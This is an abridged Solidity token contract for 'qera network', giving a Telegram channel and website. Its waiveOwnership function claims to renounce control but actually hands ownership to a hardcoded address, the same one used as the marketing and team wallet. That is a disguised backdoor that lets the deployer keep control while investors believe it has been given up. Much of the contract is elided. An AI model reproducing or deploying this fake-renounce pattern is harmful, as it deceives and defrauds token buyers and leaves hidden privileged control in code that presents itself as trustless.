...
/**
Telegram : https://t.me/qeranetwork
Website  : https://qeranetwork.live
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xCCdEBe56a091b5B40A5b8947A08FC3f6e73B5158);
    }
...
contract qeranetwork is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "qera network";
    string private _symbol = "Qnetwork";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xCCdEBe56a091b5B40A5b8947A08FC3f6e73B5158);
    address payable public teamWalletAddress = payable(0xCCdEBe56a091b5B40A5b8947A08FC3f6e73B5158);
